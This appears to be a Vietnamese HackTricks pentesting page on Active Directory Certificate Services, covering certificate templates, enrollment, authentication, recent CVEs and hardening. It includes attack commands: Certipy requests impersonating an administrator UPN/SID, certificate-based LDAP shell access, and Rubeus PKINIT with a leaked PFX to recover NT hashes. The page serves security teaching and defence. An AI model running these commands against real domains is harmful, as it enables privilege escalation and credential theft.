# Chứng chỉ AD

{{#include ../../banners/hacktricks-training.md}}

## Giới thiệu

### Các thành phần của chứng chỉ

- **Subject** cho biết chủ sở hữu của chứng chỉ.
- **Public Key** được ghép cặp với một khóa riêng tư để liên kết chứng chỉ với chủ sở hữu hợp pháp.
- **Validity Period**, được xác định bằng ngày **NotBefore** và **NotAfter**, cho biết khoảng thời gian chứng chỉ có hiệu lực.
- **Serial Number** duy nhất do Certificate Authority (CA) cấp, dùng để nhận diện từng chứng chỉ.
- **Issuer** là CA đã cấp chứng chỉ.
- **SubjectAlternativeName** cho phép thêm các tên khác cho subject, tăng tính linh hoạt trong việc nhận diện.
- **Basic Constraints** xác định chứng chỉ dành cho CA hay thực thể cuối, đồng thời quy định các giới hạn sử dụng.
- **Extended Key Usages (EKUs)** xác định mục đích cụ thể của chứng chỉ, chẳng hạn như ký mã hoặc mã hóa email, thông qua Object Identifiers (OIDs).
- **Signature Algorithm** chỉ định phương thức ký chứng chỉ.
- **Signature**, được tạo bằng khóa riêng tư của issuer, đảm bảo tính xác thực của chứng chỉ.<sup>[[4]](#references)</sup>

### Các lưu ý đặc biệt

- **Subject Alternative Names (SANs)** mở rộng phạm vi áp dụng của chứng chỉ cho nhiều danh tính, rất quan trọng đối với các máy chủ có nhiều domain. Cần có quy trình cấp chứng chỉ an toàn để tránh nguy cơ bị attacker giả mạo bằng cách thao túng thông số SAN.<sup>[[4]](#references)</sup>

### Certificate Authority (CA) trong Active Directory (AD)

AD CS ghi nhận chứng chỉ CA trong một AD forest thông qua các container được chỉ định, mỗi container có vai trò riêng:<sup>[[4]](#references)</sup>

- Container **Certification Authorities** lưu các chứng chỉ root CA đáng tin cậy.
- Container **Enrolment Services** cung cấp thông tin về Enterprise CA và các certificate template của chúng.
- Object **NTAuthCertificates** chứa các chứng chỉ CA được phép dùng cho xác thực AD.
- Container **AIA (Authority Information Access)** hỗ trợ xác thực certificate chain bằng các chứng chỉ CA trung gian và CA cross.

### Lấy chứng chỉ: Luồng yêu cầu chứng chỉ của client

1. Quá trình yêu cầu bắt đầu khi client tìm một Enterprise CA.
2. Sau khi tạo cặp khóa public-private, client tạo CSR chứa public key và các thông tin khác.
3. CA đánh giá CSR dựa trên các certificate template hiện có và cấp chứng chỉ theo quyền của template.
4. Sau khi phê duyệt, CA ký chứng chỉ bằng khóa riêng tư của mình rồi gửi lại cho client.<sup>[[4]](#references)</sup>

### Certificate Template

Được xác định trong AD, các template này quy định cấu hình và quyền cấp chứng chỉ, bao gồm EKU được phép và quyền đăng ký hoặc chỉnh sửa. Đây là yếu tố quan trọng để quản lý quyền truy cập vào các dịch vụ chứng chỉ.<sup>[[4]](#references)</sup>

**Phiên bản schema của template rất quan trọng.** Các template **v1** cũ (ví dụ, template **WebServer** tích hợp sẵn) thiếu một số cơ chế kiểm soát hiện đại. Nghiên cứu **ESC15/EKUwu** cho thấy trên các template **v1**, requester có thể nhúng **Application Policies/EKUs** vào CSR, và các giá trị này được ưu tiên hơn EKU đã cấu hình trong template. Điều này cho phép tạo chứng chỉ client-auth, enrollment agent hoặc ký mã chỉ với quyền đăng ký. Ưu tiên dùng template **v2/v3**, loại bỏ hoặc thay thế các mặc định v1, đồng thời giới hạn chặt chẽ EKU theo mục đích sử dụng dự kiến.<sup>[[1]](#references)</sup>

## Đăng ký chứng chỉ

Quá trình đăng ký chứng chỉ do administrator khởi tạo bằng cách **tạo một certificate template**, sau đó **publish** template này trên Enterprise Certificate Authority (CA). Nhờ đó, client có thể đăng ký template; việc này được thực hiện bằng cách thêm tên template vào trường `certificatetemplates` của một object Active Directory.<sup>[[4]](#references)</sup>

Để client yêu cầu chứng chỉ, cần cấp **quyền đăng ký**. Các quyền này được xác định bởi security descriptor trên certificate template và chính Enterprise CA. Muốn yêu cầu thành công, phải cấp quyền ở cả hai nơi.<sup>[[4]](#references)</sup>

### Quyền đăng ký trên template

Các quyền này được chỉ định thông qua Access Control Entries (ACEs), bao gồm các quyền như:<sup>[[4]](#references)</sup>

- Quyền **Certificate-Enrollment** và **Certificate-AutoEnrollment**, mỗi quyền gắn với một GUID cụ thể.
- **ExtendedRights**, cho phép tất cả quyền mở rộng.
- **FullControl/GenericAll**, cung cấp toàn quyền kiểm soát template.

### Quyền đăng ký trên Enterprise CA

Các quyền của CA được nêu trong security descriptor của CA, có thể xem qua console quản lý Certificate Authority. Một số cài đặt thậm chí cho phép người dùng có ít quyền truy cập từ xa, điều này có thể gây rủi ro bảo mật.<sup>[[4]](#references)</sup>

### Các kiểm soát cấp chứng chỉ bổ sung

Có thể áp dụng một số kiểm soát như:<sup>[[4]](#references)</sup>

- **Manager Approval**: Đưa yêu cầu vào trạng thái chờ cho đến khi certificate manager phê duyệt.
- **Enrolment Agents and Authorized Signatures**: Chỉ định số chữ ký cần thiết trên CSR và các Application Policy OID bắt buộc.

### Các phương thức yêu cầu chứng chỉ

Có thể yêu cầu chứng chỉ thông qua:<sup>[[4]](#references)</sup>

1. **Windows Client Certificate Enrollment Protocol** (MS-WCCE), sử dụng các giao diện DCOM.
2. **ICertPassage Remote Protocol** (MS-ICPR), thông qua named pipe hoặc TCP/IP.
3. **Giao diện web đăng ký chứng chỉ**, khi đã cài đặt role Certificate Authority Web Enrollment.
4. **Certificate Enrollment Service** (CES), kết hợp với dịch vụ Certificate Enrollment Policy (CEP).
5. **Network Device Enrollment Service** (NDES) dành cho các thiết bị mạng, sử dụng Simple Certificate Enrollment Protocol (SCEP).

Người dùng Windows cũng có thể yêu cầu chứng chỉ qua GUI (`certmgr.msc` hoặc `certlm.msc`) hoặc công cụ dòng lệnh (`certreq.exe` hoặc lệnh PowerShell `Get-Certificate`).

```bash
# Example of requesting a certificate using PowerShell
Get-Certificate -Template "User" -CertStoreLocation "cert:\\CurrentUser\\My"
```

## Xác thực bằng chứng chỉ

Active Directory (AD) hỗ trợ xác thực bằng chứng chỉ, chủ yếu sử dụng các giao thức **Kerberos** và **Secure Channel (Schannel)**.<sup>[[4]](#references)</sup>

### Quy trình xác thực Kerberos

Trong quy trình xác thực Kerberos, yêu cầu của người dùng về Ticket Granting Ticket (TGT) được ký bằng **khóa riêng** của chứng chỉ người dùng. Bộ điều khiển miền thực hiện một số bước xác thực đối với yêu cầu này, bao gồm kiểm tra **tính hợp lệ**, **chuỗi chứng chỉ** và **trạng thái thu hồi** của chứng chỉ. Các bước xác thực cũng bao gồm việc xác minh chứng chỉ đến từ một nguồn đáng tin cậy và xác nhận tổ chức phát hành có trong **kho chứng chỉ NTAUTH**. Nếu xác thực thành công, TGT sẽ được cấp. Đối tượng **`NTAuthCertificates`** trong AD nằm tại:

```bash
CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<domain>,DC=<com>
```

là yếu tố then chốt để thiết lập độ tin cậy cho xác thực bằng certificate.<sup>[[4]](#references)</sup>

Kể từ đợt triển khai **KB5014754**, xác thực Kerberos bằng certificate hiện đại chủ yếu phụ thuộc vào **độ mạnh của ánh xạ**, chứ không chỉ vào EKU.<sup>[[2]](#references)</sup> Trong các forest đã được harden:

- Certificate chỉ có SAN **UPN/DNS** có thể không còn đủ để đăng nhập.
- KDC ưu tiên **strong binding**, thường là **SID security extension** (`1.3.6.1.4.1.311.25.2`) hoặc ánh xạ tường minh mạnh trong `altSecurityIdentities`.
- Nếu cert không có ánh xạ mạnh, DC ghi log **Kdcsvc Event ID 39/41** ở chế độ tương thích và từ chối xác thực ở chế độ thực thi.
- Trong các đường tấn công kết hợp, **ESC9/ESC16** rất đáng lưu ý vì chúng loại bỏ SID extension khỏi các cert được cấp; khi đó, operator dựa vào ánh xạ tường minh hoặc định dạng SAN URL SID nếu đường tấn công hỗ trợ.

### Xác thực Secure Channel (Schannel)

Schannel hỗ trợ các kết nối TLS/SSL an toàn. Trong quá trình bắt tay, client trình certificate; nếu certificate được xác thực thành công, nó sẽ cấp quyền truy cập.<sup>[[5]](#references)</sup> Việc ánh xạ certificate tới tài khoản AD có thể sử dụng hàm **S4U2Self** của Kerberos hoặc **Subject Alternative Name (SAN)** của certificate, cùng các phương thức khác.<sup>[[4]](#references)</sup>

Schannel cũng là phương án dự phòng thực tế khi **PKINIT** không khả dụng. Ví dụ, nếu domain controller không có certificate **Smart Card Logon** phù hợp, công cụ `certipy auth`/PKINIT có thể không lấy được TGT, nhưng certificate đó vẫn có thể dùng để xác thực và thực hiện các thao tác LDAP qua **LDAPS** hoặc **LDAP StartTLS**.

### Liệt kê AD Certificate Services

Có thể liệt kê các certificate service của AD thông qua truy vấn LDAP, qua đó phát hiện thông tin về **Enterprise Certificate Authority (CA)** và cấu hình của chúng. Mọi người dùng đã xác thực trong domain đều có thể truy cập thông tin này mà không cần đặc quyền đặc biệt.<sup>[[4]](#references)</sup> Các công cụ như **[Certify](https://github.com/GhostPack/Certify)** và **[Certipy](https://github.com/ly4k/Certipy)** được dùng để liệt kê và đánh giá lỗ hổng trong môi trường AD CS.<sup>[[6]](#references)</sup>

Các lệnh sử dụng những công cụ này bao gồm:

```bash
# Enumerate trusted root CA certificates, Enterprise CAs, and web endpoints
Certify.exe cas

# Identify vulnerable templates and dump relevant permissions
Certify.exe find /vulnerable
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /showAdmins

# Certipy 5.x enumeration focused on enabled/vulnerable templates
certipy find -enabled -vulnerable -hide-admins -u john@corp.local -p Passw0rd -dc-ip 10.10.10.10

# Save JSON/CSV output for offline review or BloodHound correlation
certipy find -json -output corp_adcs -u john@corp.local -p Passw0rd -dc-ip 10.10.10.10

# Request a certificate over the Web Enrollment endpoint or DCOM/RPC
certipy req -web -ca corp-CA -target ca.corp.local -template WebServer -upn john@corp.local -dns www.corp.local
certipy req -ca corp-CA -target ca.corp.local -template User -upn administrator@corp.local -sid S-1-5-21-...-500

# Use the issued certificate either for PKINIT or directly for LDAP Schannel auth
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10 -ldap-shell

# Enumerate Enterprise CAs and certificate templates with certutil
certutil.exe -TCAInfo
certutil -v -dstemplate
```

### Các cờ liệt kê Certify và PKINIT với Rubeus

Các biến thể lệnh Certify sau đây giữ nguyên bộ lọc và tùy chọn đầu ra riêng.<sup>[[6]](#references)</sup>

```bash
# Enumerate trusted root CA certificates, Enterprise CAs and HTTP enrollment endpoints
# Useful flags: /domain, /path, /hideAdmins, /showAllPermissions, /skipWebServiceChecks
Certify.exe cas [/ca:SERVER\ca-name | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/hideAdmins] [/showAllPermissions] [/skipWebServiceChecks]

# Identify vulnerable certificate templates and filter for common abuse cases
Certify.exe find
Certify.exe find /vulnerable [/currentuser]
Certify.exe find /enrolleeSuppliesSubject   # ESC1 candidates (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
Certify.exe find /clientauth                # templates with client-auth EKU
Certify.exe find /showAllPermissions        # include template ACLs in output
Certify.exe find /json /outfile:C:\Temp\adcs.json

# Enumerate PKI object ACLs (Enterprise PKI container, templates, OIDs) – useful for ESC4/ESC7 discovery
Certify.exe pkiobjects [/domain:domain.local] [/showAdmins]

# Use Certipy for enumeration and identifying vulnerable templates
certipy find -vulnerable -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128

# Enumerate Enterprise CAs and certificate templates with certutil
certutil.exe -TCAInfo
certutil -v -dstemplate
```

Rubeus cũng có thể sử dụng chứng chỉ PFX được bảo vệ bằng mật khẩu để xác thực PKINIT và yêu cầu TGT. Tùy chọn `/getcredentials` yêu cầu một vé dịch vụ U2U và cố gắng khôi phục NT hash của tài khoản:<sup>[[7]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:<USER> /certificate:C:\temp\leaked.pfx /password:<PFX_PASSWORD> /getcredentials /ptt
```

Để xem nội dung cụ thể về ESC và lạm dụng CA, hãy xem [AD CS Domain Escalation](ad-certificates/domain-escalation.md).

---

## Lỗ hổng gần đây & Cập nhật bảo mật (2022-2025)

| Năm | ID / Tên | Tác động | Điểm chính |
|------|-----------|--------|----------------|
| 2022 | **CVE-2022-26923** – “Certifried” / ESC6 | *Leo thang đặc quyền* bằng cách giả mạo chứng chỉ tài khoản máy tính trong quá trình PKINIT. | Bản vá được đưa vào các bản cập nhật bảo mật ngày **10 tháng 5, 2022**. Các biện pháp kiểm tra và kiểm soát ánh xạ mạnh được giới thiệu qua **KB5014754**; hiện các môi trường nên ở chế độ *Full Enforcement*.  |
| 2023 | **CVE-2023-35350 / 35351** | *Thực thi mã từ xa* trong các vai trò AD CS Web Enrollment (certsrv) và CES. | PoC công khai còn hạn chế, nhưng các thành phần IIS dễ bị tấn công thường được phơi lộ trong mạng nội bộ. Bản vá được phát hành trong Patch Tuesday **tháng 7 năm 2023**.  |
| 2024 | **CVE-2024-49019** – “EKUwu” / ESC15 | Với các **mẫu v1**, người yêu cầu có quyền đăng ký có thể nhúng **Application Policies/EKUs** vào CSR; các giá trị này được ưu tiên hơn EKU của mẫu, tạo ra chứng chỉ xác thực máy khách, Enrollment Agent hoặc ký mã. | Đã được vá vào **ngày 12 tháng 11, 2024**. Thay thế hoặc vô hiệu hóa bằng các mẫu v1 (ví dụ: WebServer mặc định), giới hạn EKU theo mục đích và hạn chế quyền đăng ký. |

### Lộ trình hardening của Microsoft (KB5014754)

Microsoft triển khai theo ba giai đoạn (Compatibility → Audit → Enforcement) để chuyển xác thực chứng chỉ Kerberos khỏi các ánh xạ ngầm yếu. Kể từ **ngày 11 tháng 2, 2025**, domain controller tự động chuyển sang **Full Enforcement** nếu giá trị registry `StrongCertificateBindingEnforcement` chưa được đặt. Sau đó, Microsoft cập nhật lộ trình để vẫn cho phép quay về chế độ compatibility cho đến bản cập nhật bảo mật **ngày 9 tháng 9, 2025**.<sup>[[2]](#references)</sup> Quản trị viên nên:

1. Cài bản vá cho tất cả DC và máy chủ AD CS (tháng 5 năm 2022 trở đi).
2. Theo dõi Event ID 39/41 để phát hiện ánh xạ yếu trong giai đoạn *Audit*.
3. Cấp lại chứng chỉ xác thực máy khách với **SID extension** mới hoặc cấu hình ánh xạ thủ công mạnh trước khi enforcement chặn các ánh xạ yếu.

### Ghi chú cho operator về các forest đã harden

- **Chỉ ESC1/ESC6 không còn là toàn bộ vấn đề** trong các môi trường từ năm 2025 trở đi. Nếu yêu cầu chứng chỉ cho principal khác, thông thường bạn cũng cần một thành phần ánh xạ mạnh như SID extension hoặc ánh xạ tường minh.
- **ESC15 (EKUwu)** chủ yếu hữu ích trong các môi trường chưa vá, vì nó biến các mẫu **v1** tưởng như vô hại, chẳng hạn **WebServer**, thành chứng chỉ có khả năng xác thực hoặc Enrollment Agent bằng cách chèn **Application Policies**. Kerberos PKINIT vẫn kiểm tra EKU, nhưng **LDAP Schannel** cũng chấp nhận Application Policies, nên lạm dụng dựa trên LDAP vẫn còn khả thi.<sup>[[1]](#references)</sup>
- **ESC16** là tùy chọn áp dụng trên toàn CA: nếu CA tắt SID security extension trên toàn cục, mọi chứng chỉ được cấp đều quay về hành vi ánh xạ yếu hơn, trừ khi chuỗi tấn công chèn SID theo một định dạng khác được hỗ trợ.
- **Các quyền ESC7 khác nhau:** quyền `ManageCA` trên CA có thể cho phép thay đổi các thiết lập như `EDITF_ATTRIBUTESUBJECTALTNAME2` (ESC6), trong khi `ManageCertificates` kiểm soát việc phê duyệt yêu cầu. Một mục Deny tường minh đối với quyền certificate-manager có thể chặn đường phê duyệt đó ngay cả khi cũng có mục Allow; hãy đánh giá ACL CA hiệu lực trước khi kết hợp các thiết lập và mẫu. Xem [đánh giá ACL CA của Microsoft](https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-edit-vulnerable-ca-setting).

---

## Cải tiến về phát hiện & hardening

* **Cảm biến AD CS của Defender for Identity (2023-2024)** hiện cung cấp các đánh giá tình trạng bảo mật cho ESC1-ESC8/ESC11 và tạo cảnh báo theo thời gian thực, chẳng hạn *“Cấp chứng chỉ domain controller cho một đối tượng không phải DC”* (ESC8) và *“Ngăn đăng ký chứng chỉ với Application Policies tùy ý”* (ESC15). Hãy triển khai cảm biến trên tất cả máy chủ AD CS để tận dụng các tính năng phát hiện này.<sup>[[3]](#references)</sup>
* Tắt hoặc giới hạn chặt tùy chọn **“Supply in the request”** trên mọi mẫu; ưu tiên các giá trị SAN/EKU được xác định tường minh.
* Xóa **Any Purpose** hoặc **No EKU** khỏi các mẫu, trừ khi thực sự cần thiết (giảm rủi ro trong các tình huống ESC2).
* Yêu cầu **phê duyệt của quản lý** hoặc quy trình Enrollment Agent chuyên biệt cho các mẫu nhạy cảm (ví dụ: WebServer / CodeSigning).
* Giới hạn web enrollment (`certsrv`) và các endpoint CES/NDES cho mạng đáng tin cậy hoặc đặt sau xác thực bằng chứng chỉ máy khách.
* Bắt buộc mã hóa RPC enrollment (`certutil -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST`) để giảm thiểu ESC11 (RPC relay). Cờ này **được bật theo mặc định**, nhưng thường bị tắt để hỗ trợ các máy khách cũ, làm nguy cơ relay xuất hiện trở lại.
* Bảo vệ các **endpoint enrollment dựa trên IIS** (CES/Certsrv): tắt NTLM nếu có thể hoặc yêu cầu HTTPS + Extended Protection để chặn ESC8 relay.

Đánh giá ESC11 trên máy chủ đang chạy CA; máy chủ này có thể là máy chủ thành viên domain chứ không phải domain controller. Đọc `InterfaceFlags` của CA đang hoạt động trong `HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration`; nếu không đọc được hoặc thiếu giá trị thì kết quả là chưa xác định, không phải bằng chứng rằng mã hóa RPC đã bị tắt. Nếu bit `IF_ENFORCEENCRYPTICERTREQUEST` đang tắt, đó là dấu hiệu cần kiểm tra cấu hình, nhưng vẫn cần có endpoint enrollment RPC truy cập được, thông tin xác thực có thể bị ép buộc và mẫu chứng chỉ khả dụng. Với ESC8, chỉ có phản hồi HTTP NTLM challenge là chưa đủ: hãy xác nhận có endpoint enrollment hoạt động.

---

## References

- [1] [EKUwu: Không chỉ là một ESC AD CS khác](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [2] [KB5014754: Các thay đổi về xác thực dựa trên chứng chỉ trên domain controller Windows](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [3] [Đánh giá tình trạng bảo mật chứng chỉ - Microsoft Defender for Identity](https://learn.microsoft.com/en-us/defender-for-identity/security-posture-assessments/certificates)
- [4] [Certified Pre-Owned: Lạm dụng Active Directory Certificate Services](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
- [5] [Xác thực máy khách SSL/TLS là gì và hoạt động như thế nào?](https://comodosslstore.com/blog/what-is-ssl-tls-client-authentication-how-does-it-work.html)
- [6] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [7] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
{{#include ../../banners/hacktricks-training.md}}
